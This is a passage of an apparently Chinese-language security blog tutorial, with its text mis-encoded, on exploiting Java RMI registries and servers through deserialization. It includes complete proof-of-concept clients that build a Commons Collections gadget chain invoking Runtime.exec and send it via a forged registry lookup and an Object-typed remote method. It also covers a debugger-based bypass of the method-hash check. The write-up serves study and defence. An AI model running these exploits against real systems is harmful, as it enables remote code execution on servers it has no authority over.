class="hljs-string">&quot;aaa&quot;</span>);<br><br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(tiedMapEntry, <span class="hljs-string">&quot;bbb&quot;</span>);<br>        lazyMap.remove(<span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        Class&lt;ChainedTransformer&gt; c2 = ChainedTransformer.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">iTransformersField</span> <span class="hljs-operator">=</span> c2.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        iTransformersField.setAccessible(<span class="hljs-literal">true</span>);<br>        iTransformersField.set(chainedTransformer, transformers);<br>        <span class="hljs-keyword">return</span> map2;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ‰ä¸€ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹å°±æ˜¯è°ƒç”¨<code>bind()ã€rebind</code>çš„æ—¶å€™æ— æ³•ç›´æ¥ä¼ å…¥<code>AnnotationInvocationHandler</code>ç±»çš„å¯¹è±¡ï¼Œå¿…é¡»è¦è½¬ä¸ºRemoteç±»æ‰è¡Œã€‚è¿™é‡Œä½¿ç”¨äº†ä¸‹é¢çš„æ–¹å¼è¿›è¡Œè½¬æ¢ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) getEvilClass();<br><br><span class="hljs-comment">//ä½¿ç”¨AnnotationInvocationHandleråŠ¨æ€ä»£ç†Remote</span><br><span class="hljs-type">Remote</span> <span class="hljs-variable">remote</span> <span class="hljs-operator">=</span> (Remote) Proxy.newProxyInstance(Remote.class.getClassLoader(),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Remote.class&#125;, handler);<br><br></code></pre></td></tr></table></figure>

<p>ä¸‹é¢æ˜¯è¯¦ç»†æµç¨‹ï¼š</p>
<ul>
<li>cc1çš„payloadæ˜¯ä¸€ä¸ª<code>AnnotationInvocationHandler</code>å¯¹è±¡ï¼Œåœ¨å…¶æ„é€ çš„æ—¶å€™ä¼ å…¥äº†ä¸€ä¸ª HashMapï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªæ¶æ„å¯¹è±¡ï¼ˆé€šè¿‡ getEvilClass() æ–¹æ³•ç”Ÿæˆï¼‰ï¼Œè¿™ä¸ª HashMap è¢«ç”¨ä½œ <code>AnnotationInvocationHandler#memberValues</code> å±æ€§ï¼Œåˆå› ä¸ºå®ƒç°åœ¨æ˜¯InvocationHandlerç±»å‹ï¼Œé€šè¿‡ Proxy.newProxyInstanceæ–¹æ³•ï¼Œè¿™æ—¶<code>memberValues</code> å®é™…ä¸Šæ˜¯ä¸€ä¸ªä»£ç†å¯¹è±¡ï¼Œæ‰€æœ‰å¯¹ <code>memberValues</code> çš„æ–¹æ³•è°ƒç”¨ï¼ˆä¾‹å¦‚ <code>get()</code> æˆ– <code>entrySet()</code>ï¼‰éƒ½ä¼šè¢«å§”æ‰˜åˆ° <code>AnnotationInvocationHandler.invoke()</code> æ–¹æ³•ã€‚</li>
<li>åœ¨æœåŠ¡ç«¯è§¦å‘var.readobject()æ—¶ï¼Œä¼šè¿›å…¥<code>AnnotationInvocationHandler</code>ç±»çš„readobject()</li>
<li>åœ¨readobject()ä¸­ä¼šæ‰§è¡Œ<code>this.memberValues.entrySet()</code>ã€‚entrySet()ï¼Œè¿™æ˜¯ä¸€ä¸ªmapçš„æ–¹æ³•ã€‚æ ¹æ®åŠ¨æ€ä»£ç†æ€§è´¨ï¼Œæˆ‘ä»¬ç»‘å®šäº†mapçš„æ–¹æ³•åˆ°<code>AnnotationInvocationHandler.invoke</code>æ–¹æ³•ï¼Œæ‰€ä»¥å°±ä¼šè¿›å…¥invokeæ–¹æ³•ã€‚</li>
<li><code>AnnotationInvocationHandler</code>å¯¹è±¡ä¸­åˆå¼„äº†ä¸€ä¸ªlazyMapåœ¨memberValueså±æ€§ä¸­ï¼åªè¦è§¦å‘äº†è¿™ä¸ªlazyMapçš„getæ–¹æ³•å°±ç­‰äºæˆåŠŸã€‚</li>
<li>è€Œ<code>AnnotationInvocationHandler.invoke</code>æ–¹æ³•ä¸­åˆšå¥½æœ‰<code>this.memberValues.get(var4);</code>ï¼Œè€Œè¿™ä¸ªthis.memberValueså°±æ˜¯lazyMapã€‚</li>
</ul>
<h2 id="unbindã€lookup"><a href="#unbindã€lookup" class="headerlink" title="unbindã€lookup"></a>unbindã€lookup</h2><p>å› ä¸º unbind å’Œ lookup çš„æœ€ç»ˆåˆ©ç”¨å’Œæ€æƒ³éƒ½æ˜¯ä¸€æ ·çš„ï¼Œè¿™é‡Œæˆ‘ä»¬å°±åªæ‹¿ lookup è¿™é‡Œæ¥å­¦ä¹ ã€‚æˆ‘ä»¬çœ‹åˆ°è¿™é‡Œåªæ¥å—ä¸€ä¸ªStringç±»å‹çš„å‚æ•°ã€‚å¦‚æœæˆ‘ä»¬è¦æ§åˆ¶ä¼ é€’è¿‡å»çš„åºåˆ—åŒ–å€¼çš„è¯ï¼Œä¸èƒ½ç›´æ¥ä¼ é€’ç»™<code>lookup</code>è¿™ä¸ªæ–¹æ³•ï¼Œä½†æ˜¯å®ƒå‘é€è¯·æ±‚çš„æµç¨‹æ˜¯å¯ä»¥ç›´æ¥å¤åˆ¶çš„ï¼Œåªéœ€è¦æ¨¡ä»¿<code>lookup</code>ä¸­å‘é€è¯·æ±‚çš„æµç¨‹ï¼Œå°±èƒ½å¤Ÿæ§åˆ¶å‘é€è¿‡å»çš„å€¼ä¸ºä¸€ä¸ªå¯¹è±¡ã€‚è¯¦æƒ…çœ‹ä¸‹é¢ä»£ç ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241231171605073.png" alt="image-20241231171605073"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> sun.rmi.server.UnicastRef;<br><br><span class="hljs-keyword">import</span> java.io.ObjectOutput;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.rmi.server.Operation;<br><span class="hljs-keyword">import</span> java.rmi.server.RemoteCall;<br><span class="hljs-keyword">import</span> java.rmi.server.RemoteObject;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1099</span>);<br><br>        <span class="hljs-comment">//åˆ›å»ºæ¶æ„ InvocationHandler</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) getEvilClass();<br><br>        <span class="hljs-comment">//ä½¿ç”¨AnnotationInvocationHandleråŠ¨æ€ä»£ç†Remote</span><br>        <span class="hljs-type">Remote</span> <span class="hljs-variable">remote</span> <span class="hljs-operator">=</span> (Remote) Proxy.newProxyInstance(Remote.class.getClassLoader(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Remote.class&#125;, handler);<br><br><br>        <span class="hljs-comment">//è·å–ref(java.rmi.server.RemoteObject#ref)</span><br>        Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();<br>        fields_0[<span class="hljs-number">0</span>].setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">UnicastRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> (UnicastRef) fields_0[<span class="hljs-number">0</span>].get(registry);<br><br>        <span class="hljs-comment">//è·å–operations</span><br>        Field[] fields_1 = registry.getClass().getDeclaredFields();<br>        fields_1[<span class="hljs-number">0</span>].setAccessible(<span class="hljs-literal">true</span>);<br>        Operation[] operations = (Operation[]) fields_1[<span class="hljs-number">0</span>].get(registry);<br><br>        <span class="hljs-comment">// ä¼ªé€ lookupçš„ä»£ç ï¼Œå»ä¼ªé€ ä¼ è¾“ä¿¡æ¯</span><br>        <span class="hljs-type">RemoteCall</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> ref.newCall((RemoteObject) registry, operations, <span class="hljs-number">2</span>, <span class="hljs-number">4905912898345647071L</span>);<br>        <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> var2.getOutputStream();<br>        var3.writeObject(remote);<br>        ref.invoke(var2);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getEvilClass</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformerMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationdhdlConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationdhdlConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationdhdlConstructor.newInstance(Target.class, transformerMap);<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>æ³¨å†Œä¸­å¿ƒåœ¨å¤„ç†è¯·æ±‚çš„æ—¶å€™æ˜¯ç›´æ¥è¿›è¡Œååºåˆ—åŒ–ï¼Œæ‰€ä»¥è¿˜æ˜¯å¯ä»¥é€ æˆååºåˆ—åŒ–æ”»å‡»ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241231213814990.png" alt="image-20241231213814990"></p>
<h2 id="list"><a href="#list" class="headerlink" title="list"></a>list</h2><p>æ²¡ååºåˆ—åŒ–çš„ç‚¹ï¼Œè¿™é‡Œå°±ä¸è¿‡å¤šé˜è¿°äº†</p>
<h1 id="æ”»å‡»æœåŠ¡ç«¯"><a href="#æ”»å‡»æœåŠ¡ç«¯" class="headerlink" title="æ”»å‡»æœåŠ¡ç«¯"></a>æ”»å‡»æœåŠ¡ç«¯</h1><p>åœ¨ Client ç«¯è·å–åˆ° Server ç«¯åˆ›å»ºçš„ Stub åï¼Œä¼šåœ¨æœ¬åœ°è°ƒç”¨è¿™ä¸ª Stub å¹¶ä¼ é€’å‚æ•°ï¼ŒStub ä¼šåºåˆ—åŒ–è¿™ä¸ªå‚æ•°ï¼Œå¹¶ä¼ é€’ç»™ Server ç«¯ï¼ŒServer ç«¯ä¼šååºåˆ—åŒ– Client ç«¯ä¼ å…¥çš„å‚æ•°å¹¶è¿›è¡Œè°ƒç”¨ï¼Œå¦‚æœè¿™ä¸ªå‚æ•°æ˜¯ Object ç±»å‹çš„æƒ…å†µä¸‹ï¼ŒClient ç«¯å¯ä»¥ä¼ ç»™ Server ç«¯ä»»æ„çš„ç±»ï¼Œç›´æ¥é€ æˆååºåˆ—åŒ–æ¼æ´ã€‚</p>
<h2 id="æœåŠ¡ç«¯å­˜åœ¨ä¸€ä¸ªæ¥æ”¶-Object-å‚æ•°çš„è¿œç¨‹æ–¹æ³•"><a href="#æœåŠ¡ç«¯å­˜åœ¨ä¸€ä¸ªæ¥æ”¶-Object-å‚æ•°çš„è¿œç¨‹æ–¹æ³•" class="headerlink" title="æœåŠ¡ç«¯å­˜åœ¨ä¸€ä¸ªæ¥æ”¶ Object å‚æ•°çš„è¿œç¨‹æ–¹æ³•"></a>æœåŠ¡ç«¯å­˜åœ¨ä¸€ä¸ªæ¥æ”¶ Object å‚æ•°çš„è¿œç¨‹æ–¹æ³•</h2><p>ä¾‹å¦‚ï¼Œè¿œç¨‹è°ƒç”¨çš„æ¥å£ RemoteInterface å­˜åœ¨ä¸€ä¸ª <code>sayHello</code> æ–¹æ³•çš„å‚æ•°æ˜¯ Object ç±»å‹ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250101012158981.png" alt="image-20250101012158981"></p>
<p>é‚£æˆ‘ä»¬å°±ç›´æ¥å¯ä»¥ä¼ ä¸€ä¸ªååºåˆ—åŒ– payload è¿›å»æ‰§è¡Œ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.rmi.NotBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NotBoundException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1099</span>);<br>        <span class="hljs-type">IRemoteObj</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> (IRemoteObj) registry.lookup(<span class="hljs-string">&quot;remoteObj&quot;</span>);<br>        System.out.println(remoteObj.sayHello(getEvilClass()));<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getEvilClass</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformerMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationdhdlConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationdhdlConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationdhdlConstructor.newInstance(Target.class, transformerMap);<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>è¿™éƒ¨åˆ†å°±æ˜¯çº¯çº¯çš„ Java åŸç”Ÿååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨è¿‡ç¨‹ã€‚</p>
<h2 id="ç»•è¿‡-Object-ç±»å‹å‚æ•°"><a href="#ç»•è¿‡-Object-ç±»å‹å‚æ•°" class="headerlink" title="ç»•è¿‡ Object ç±»å‹å‚æ•°"></a>ç»•è¿‡ Object ç±»å‹å‚æ•°</h2><p>éå¾—æœåŠ¡ç«¯æœ‰Objectç±»å‹å‚æ•°çš„è¿œç¨‹æ–¹æ³•æ‰èƒ½åˆ©ç”¨çš„è¯ä¹Ÿå¤ªé¸¡è‚‹äº†ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°è¯•ç»•è¿‡è¿™ä¸ªé™åˆ¶ã€‚æˆ‘ä»¬æŠŠæœåŠ¡ç«¯çš„Objectç±»å‹çš„æ–¹æ³•æ³¨é‡Šæ‰ï¼Œè¿™æ—¶å€™ç”¨payloadå»æ‰“ï¼Œæˆ‘ä»¬ä¼šå‘ç°unrecognized method hash çš„é”™è¯¯ã€‚å…¶å®å°±æ˜¯åœ¨æœåŠ¡ç«¯æ²¡æœ‰æ‰¾åˆ°å¯¹åº”çš„è°ƒç”¨æ–¹æ³•ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250107130904870.png" alt="image-20250107130904870"></p>
<p>æˆ‘ä»¬ä¹‹å‰è¯´è¿‡æœåŠ¡ç«¯ç”± <strong>UnicastServerRef</strong> çš„ <code>dispatch</code> æ–¹æ³•æ¥å¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œä¼šåœ¨ <code>hashToMethod_Map.get(op)</code> ä¸­å¯»æ‰¾ Client ç«¯å¯¹åº”æ‰§è¡Œ Method çš„ hash å€¼ï¼Œå¦‚æœæ‰¾åˆ°äº†ï¼Œåˆ™ä¼šååºåˆ—åŒ– Client ç«¯ä¼ æ¥çš„å‚æ•°ï¼Œå¹¶ä¸”é€šè¿‡åå°„è°ƒç”¨ã€‚è¿™ä¸ª hash å®é™…ä¸Šæ˜¯ä¸€ä¸ªåŸºäºæ–¹æ³•ç­¾åçš„ SHA1 hash å€¼ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250107135350049.png" alt="image-20250107135350049"></p>
<p>è€Œå¦‚æœæˆ‘ä»¬äººä¸ºçš„ä¿®æ”¹è¿™ä¸ª hash ä½¿å…¶é€šè¿‡ä¸€è‡´æ€§æ£€æŸ¥åï¼Œå°±ä¼šè¿›å…¥åˆ° unmarshalValue è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œå†å¦‚æœæœåŠ¡ç«¯è¿™ä¸ªæ–¹æ³•çš„å…¥å‚ç±»å‹ä¸æ˜¯åŸºç¡€ç±»å‹çš„è¯ï¼Œæˆ‘ä»¬å°±èƒ½é€šç•…çš„è¿›è¡Œååºåˆ—åŒ–æ¶æ„å¯¹è±¡ã€‚é€ æˆååºåˆ—åŒ–ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250109103934648.png" alt="image-20250109103934648"></p>
<p><strong>RMI æœåŠ¡ç«¯éœ€è¦èµ·ä¸€ä¸ªå…·æœ‰ Object å‚æ•°çš„ RMI æ–¹æ³• çš„åˆ©ç”¨æ¡ä»¶é™åˆ¶ å°±æ‰©å±•åˆ°äº† RMI æœåŠ¡ç«¯åªéœ€è¦èµ·ä¸€ä¸ªå…·æœ‰ä¸å±äºåŸºç¡€æ•°æ®ç±»å‹å‚æ•°çš„ RMI æ–¹æ³•ï¼ˆæ¯”å¦‚ String å•¥çš„ï¼‰</strong></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯æƒ³åŠæ³•è®©æˆ‘ä»¬ä¼ é€’çš„æ˜¯ Server ç«¯èƒ½æ‰¾åˆ°çš„å‚æ•°æ˜¯ HelloObject çš„ Method çš„ hashï¼Œä½†æ˜¯ä¼ é€’çš„å‚æ•°å´ä¸æ˜¯ HelloObject è€Œæ˜¯æ¶æ„çš„ååºåˆ—åŒ–æ•°æ®ï¼ˆå¯èƒ½æ˜¯ Objectæˆ–å…¶ä»–çš„ç±»ï¼‰ã€‚æ”»å‡»åŸç†æ ¸å¿ƒåœ¨äºæ›¿æ¢åŸæœ¬ä¸æ˜¯ Object ç±»å‹çš„å‚æ•°å˜ä¸º Object ç±»å‹ã€‚</p>
<p> mogwailabs çš„ [PPT](<a href="https://github.com/mogwailabs/rmi-deserialization/blob/master/BSides">https://github.com/mogwailabs/rmi-deserialization/blob/master/BSides</a> Exploiting RMI Services.pdf) ä¸­æå‡ºäº†ä»¥ä¸‹ 4 ç§æ–¹æ³•ï¼š</p>
<ul>
<li>ç›´æ¥ä¿®æ”¹rmiåº•å±‚æºç </li>
<li>åœ¨è¿è¡Œæ—¶ï¼Œæ·»åŠ è°ƒè¯•å™¨hookå®¢æˆ·ç«¯ï¼Œç„¶åæ›¿æ¢</li>
<li>åœ¨å®¢æˆ·ç«¯ä½¿ç”¨Javassistå·¥å…·æ›´æ”¹å­—èŠ‚ç </li>
<li>ä½¿ç”¨ä»£ç†ï¼Œæ¥æ›¿æ¢å·²ç»åºåˆ—åŒ–çš„å¯¹è±¡ä¸­çš„å‚æ•°ä¿¡æ¯</li>
</ul>
<p>å¹¶ä¸”åœ¨ PPT ä¸­è¿˜ç»™å‡ºäº† hook ç‚¹ï¼Œé‚£å°±æ˜¯åŠ¨æ€ä»£ç†ä¸­ä½¿ç”¨çš„ RemoteObjectInvocationHandler çš„ <code>invokeRemoteMethod</code> æ–¹æ³•ã€‚</p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬å°è¯•ä¸€ä¸‹ï¼Œç”±äºæ˜¯å­¦ä¹ å’Œæµ‹è¯•ï¼Œè¿™é‡Œå°†ä½¿ç”¨æœ€æ–¹ä¾¿çš„ debugger æ–¹å¼ã€‚Afant1 å¸ˆå‚…ä½¿ç”¨äº† Java Agent çš„æ–¹å¼ï¼Œåœ¨<a href="https://www.anquanke.com/post/id/200860">è¿™ç¯‡æ–‡ç« </a>é‡Œï¼Œ0c0c0f å¸ˆå‚…ä½¿ç”¨äº†æµé‡å±‚çš„æ›¿æ¢ï¼Œåœ¨<a href="https://mp.weixin.qq.com/s/TbaRFaAQlT25ASmdTK_UOg">è¿™ç¯‡æ–‡ç« </a>é‡Œï¼Œæœ‰å…´è¶£çš„å¸ˆå‚…è¯·è‡ªè¡ŒæŸ¥çœ‹ã€‚</p>
<p>Server ç«¯ä»£ç ä¸å˜ï¼Œæˆ‘ä»¬åœ¨ Client ç«¯å°† Object å‚æ•°å’Œ HelloObject å‚æ•°çš„ <code>sayHello</code> æ–¹æ³•éƒ½å†™ä¸Šï¼Œå¦‚ä¸‹ï¼š</p>
<p>æˆ‘ä»¬åœ¨æœåŠ¡ç«¯çš„æ¥å£ RemoteInterface ä¸­å®šä¹‰ä¸€ä¸ª <code>sayHello</code> æ–¹æ³•ï¼Œä»–æ¥æ”¶ä¸€ä¸ªåœ¨ Server ç«¯å­˜åœ¨çš„ HelloObject ç±»ä½œä¸ºå‚æ•°ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250108173025921.png" alt="image-20250108173025921"></p>
<p>Server ç«¯ä»£ç ä¸å˜ï¼Œæˆ‘ä»¬åœ¨ Client ç«¯å°† Object å‚æ•°å’Œ HelloObject å‚æ•°çš„ <code>sayHello</code> æ–¹æ³•éƒ½å†™ä¸Šï¼Œå¦‚ä¸‹ï¼š</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250108173118138.png" alt="image-20250108173118138"></p>
<p>è°ƒç”¨æ—¶ï¼Œä¾æ—§ä½¿ç”¨ Object å‚æ•°çš„ <code>sayHello</code> æ–¹æ³•è°ƒç”¨ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250108173151251.png" alt="image-20250108173151251"></p>
<p>åœ¨ RemoteObjectInvocationHandler çš„ <code>invokeRemoteMethod</code> æ–¹æ³•å¤„ä¸‹æ–­ï¼Œå°† Method æ”¹ä¸ºæœåŠ¡ç«¯å­˜åœ¨çš„ HelloObject çš„ Methodã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250108173302048.png" alt="image-20250108173302048"></p>
<p>æ”»å‡»æˆåŠŸã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250108173324455.png" alt="image-20250108173324455"></p>
